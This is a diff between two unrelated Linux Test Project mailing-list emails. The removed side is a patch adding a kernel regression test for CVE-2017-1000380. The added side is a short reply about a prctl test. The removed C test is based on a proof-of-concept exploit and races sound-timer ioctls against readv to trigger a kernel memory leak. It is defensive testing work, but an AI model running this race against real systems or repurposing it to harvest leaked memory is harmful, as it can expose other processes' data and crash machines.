@@ -1,239 +1,42 @@
-From: Michael Moese <mmoese@suse.de>
-Date: Thu, 11 Jul 2019 16:10:26 +0200
-Subject: [LTP] [PATCH v4] Add a regression test for CVE-2017-1000380
-Message-ID: <20190711141026.14705-1-mmoese@suse.de>
+From: Yang Xu <xuyang2018.jy@cn.fujitsu.com>
+Date: Fri, 12 Jul 2019 12:34:06 +0800
+Subject: [LTP] [PATCH RESEND] syscalls/prctl06.c: New test for prctl()
+ with PR_{SET, GET}_NO_NEW_PRIVS
+In-Reply-To: <20190711113405.GA27889@rei.lan>
+References: <20190709105303.GA4914@rei.lan>
+ <1562366936-26456-1-git-send-email-xuyang2018.jy@cn.fujitsu.com>
+ <20190710105207.GC30934@rei.lan> <5D26EBEF.3090604@cn.fujitsu.com>
+ <20190711113405.GA27889@rei.lan>
+Message-ID: <5D280DBE.4010202@cn.fujitsu.com>
 List-Id: <ltp.lists.linux.it>
 MIME-Version: 1.0
 Content-Type: text/plain; charset="us-ascii"
 Content-Transfer-Encoding: 7bit
 To: ltp@lists.linux.it
 
-A race condition was present in the linux kernel, which could lead to
-a leak of arbitrary kernel memory to userspace applications.
+> Hi!
+>>> We are executing setuid binary that was created by root here so
+>>> shouldn't we just check that getuid() and getgid() returns 0?
+>>>
+>> I try it.  whether we set or not set new privs, the getuid() or getgid() return nobody in
+>> prctl06_execve.  Or, I misunderstand your advise?
+> Looking closely into the manuals the setuid and setgid bits are supposed
+> to set the effective ids, so I guess that the geteuid() and getegid()
+> will return 0 when the process was executed without the prctl().
+>
 
-The issue was fixed in those kernel commits:
- http://git.kernel.org/linus/d11662f4f798b50d8c8743f433842c3e40fe3378
- http://git.kernel.org/linus/ba3021b2c79b2fa9114f92790a99deb27a65b728
+Hi Cyril
 
-This patch adds a regression test triggering this race condition.
+Yes. I will remove capeff and setuid,setgid check in my v3 patch.  For the prctl value
+and check that it cannot be unset, I think it is a error test as manpage said
+"prctl() fails with EINVAL when options is PR_SET_NO_NEW_PRIVS&  arg2 is not equal to 1 or arg3, arg4, or arg5 is nonzero."
 
-Signed-off-by: Michael Moese <mmoese@suse.de>
----
-Changes to v2:
- - remove leftover declarion of unused variable in ioctl_thread()
- - reduced iov_len by 1, so the strlen command hits a valid \0 for sure
-   in any case.
- - fix whitespace before tab in Makefile
+I will add it into prctl02.c.  Also, there are many error conditions for prctl. So I think when my prctl07.c are merged into
 
-Changes to v1:
- - Initialize buffers in ioctl_thread() outside of the loop
- - use return unused() instead of a void* cast of NULL in ioctl_thread()
- - reset non-zero flag in run() for every iteration of the main loop
----
- runtest/cve                          |   1 +
- testcases/kernel/Makefile            |   1 +
- testcases/kernel/sound/.gitignore    |   1 +
- testcases/kernel/sound/Makefile      |  12 +++
- testcases/kernel/sound/snd_timer01.c | 139 +++++++++++++++++++++++++++
- 5 files changed, 154 insertions(+)
- create mode 100644 testcases/kernel/sound/.gitignore
- create mode 100644 testcases/kernel/sound/Makefile
- create mode 100644 testcases/kernel/sound/snd_timer01.c
+ltp, I will increase prctl02.c together.
 
-diff --git a/runtest/cve b/runtest/cve
-index 031bcdc2a..33c9196e0 100644
---- a/runtest/cve
-+++ b/runtest/cve
-@@ -36,6 +36,7 @@ cve-2017-17052 cve-2017-17052
- cve-2017-16939 cve-2017-16939
- cve-2017-17053 cve-2017-17053
- cve-2017-18075 pcrypt_aead01
-+cve-2017-1000380 snd_timer01
- cve-2018-5803 sctp_big_chunk
- cve-2018-1000001 realpath01
- cve-2018-19854 crypto_user01
-diff --git a/testcases/kernel/Makefile b/testcases/kernel/Makefile
-index 39d79c7d8..eff5b3e7d 100644
---- a/testcases/kernel/Makefile
-+++ b/testcases/kernel/Makefile
-@@ -52,6 +52,7 @@ SUBDIRS			+= connectors \
- 			   pty \
- 			   sched \
- 			   security \
-+			   sound \
- 			   timers \
- 			   tracing \
- 
-diff --git a/testcases/kernel/sound/.gitignore b/testcases/kernel/sound/.gitignore
-new file mode 100644
-index 000000000..57eae0593
---- /dev/null
-+++ b/testcases/kernel/sound/.gitignore
-@@ -0,0 +1 @@
-+snd_timer
-diff --git a/testcases/kernel/sound/Makefile b/testcases/kernel/sound/Makefile
-new file mode 100644
-index 000000000..ad1e25c30
---- /dev/null
-+++ b/testcases/kernel/sound/Makefile
-@@ -0,0 +1,12 @@
-+# SPDX-License-Identifier: GPL-2.0-or-later
-+
-+top_srcdir		:= ../../..
-+
-+include $(top_srcdir)/include/mk/testcases.mk
-+
-+CPPFLAGS		+= -D_GNU_SOURCE
-+
-+LDLIBS			+= -pthread
-+
-+
-+include $(top_srcdir)/include/mk/generic_leaf_target.mk
-diff --git a/testcases/kernel/sound/snd_timer01.c b/testcases/kernel/sound/snd_timer01.c
-new file mode 100644
-index 000000000..fe2f3ed3f
---- /dev/null
-+++ b/testcases/kernel/sound/snd_timer01.c
-@@ -0,0 +1,139 @@
-+// SPDX-License-Identifier: GPL-2.0-or-later
-+
-+/* Copyright (c) 2019 Michael Moese <mmoese@suse.com>
-+ * Regression test for CVE-2017-1000380 based on the original PoC exploit
-+ * by Alexander Potapenko <glider@google.com>
-+ *
-+ * Be careful! This test may crash your kernel!
-+ *
-+ * The test performs several ioctl() parallel with readv() on the same
-+ * file descriptor to /dev/snd/timer. A buggy kernel will leak memory
-+ * to the process, which may contain information from the the kernel or
-+ * any other process on the system.
-+ *
-+ * The issue was fixed with
-+ *   http://git.kernel.org/linus/d11662f4f798b50d8c8743f433842c3e40fe3378
-+ *   http://git.kernel.org/linus/ba3021b2c79b2fa9114f92790a99deb27a65b728
-+ */
-+
-+#include "config.h"
-+#include "tst_test.h"
-+#include "tst_taint.h"
-+#include "tst_fuzzy_sync.h"
-+#include "tst_safe_macros.h"
-+#include "tst_safe_pthread.h"
-+
-+#include <errno.h>
-+#include <fcntl.h>
-+#include <pthread.h>
-+#include <stdio.h>
-+#include <string.h>
-+#include <sys/uio.h>
-+#include <sys/ioctl.h>
-+#include <sound/asound.h>
-+
-+#define MAX_BUFSIZE 1024
-+
-+static int snd_fd;
-+static struct tst_fzsync_pair fzsync_pair;
-+
-+static void *ioctl_thread(void *unused)
-+{
-+	int tread_arg = 1;
-+	struct snd_timer_select ts;
-+	struct snd_timer_params tp;
-+
-+	memset(&ts, 0, sizeof(ts));
-+	ts.id.dev_class = 1;
-+
-+	memset(&tp, 0, sizeof(tp));
-+	tp.ticks = 1;
-+	tp.filter = 0xf;
-+
-+	while (tst_fzsync_run_b(&fzsync_pair)) {
-+
-+		ioctl(snd_fd, SNDRV_TIMER_IOCTL_TREAD, &tread_arg);
-+
-+		ioctl(snd_fd, SNDRV_TIMER_IOCTL_SELECT, &ts);
-+
-+		ioctl(snd_fd, SNDRV_TIMER_IOCTL_PARAMS, &tp);
-+
-+		ioctl(snd_fd, SNDRV_TIMER_IOCTL_START, 0);
-+
-+		tst_fzsync_end_race_b(&fzsync_pair);
-+	}
-+	return unused;
-+}
-+
-+static void setup(void)
-+{
-+	tst_fzsync_pair_init(&fzsync_pair);
-+	tst_taint_init(TST_TAINT_W | TST_TAINT_D);
-+	snd_fd = SAFE_OPEN("/dev/snd/timer",
-+			O_RDONLY|O_CREAT|O_NOCTTY|O_SYNC|O_LARGEFILE, 0);
-+}
-+
-+static void cleanup(void)
-+{
-+	tst_fzsync_pair_cleanup(&fzsync_pair);
-+	SAFE_CLOSE(snd_fd);
-+}
-+
-+static void run(void)
-+{
-+	size_t len;
-+	int size;
-+	struct iovec iov;
-+	pthread_t th;
-+	char read_buf[MAX_BUFSIZE];
-+	int i, nz;
-+	pthread_attr_t thread_attr;
-+
-+	pthread_attr_init(&thread_attr);
-+	pthread_attr_setdetachstate(&thread_attr, PTHREAD_CREATE_DETACHED);
-+	SAFE_PTHREAD_CREATE(&th, &thread_attr, ioctl_thread, NULL);
-+
-+	iov.iov_base = read_buf;
-+	iov.iov_len = sizeof(read_buf) - 1;
-+
-+	while (tst_fzsync_run_a(&fzsync_pair)) {
-+		nz = 0;
-+		memset(read_buf, 0, sizeof(read_buf));
-+		size = readv(snd_fd, &iov, 1);
-+
-+		tst_fzsync_end_race_a(&fzsync_pair);
-+
-+		/* check if it could be a valid ioctl result */
-+		if (size == 0)
-+			continue;
-+
-+		/* check if the buffer is non-empty */
-+		for (i = 0; i < size; i++) {
-+			if (read_buf[i]) {
-+				nz = 1;
-+				break;
-+			}
-+		}
-+		if (!nz)
-+			continue;
-+
-+		len = strlen(read_buf);
-+		/* the kernel's struct snd_timer_read is two unsigned integers*/
-+		if (len <= 2 * sizeof(unsigned int))
-+			continue;
-+
-+		tst_res(TFAIL, "kernel seems vulnerable");
-+		return;
-+	}
-+
-+	if (tst_taint_check() != 0)
-+		tst_res(TFAIL, "kernel seems vulnerable");
-+	else
-+		tst_res(TPASS, "kernel seems not vulnerable");
-+}
-+
-+static struct tst_test test = {
-+	.test_all = run,
-+	.setup = setup,
-+	.cleanup = cleanup,
-+};
--- 
-2.22.0
+Thanks
+Yang Xu
+
+
 
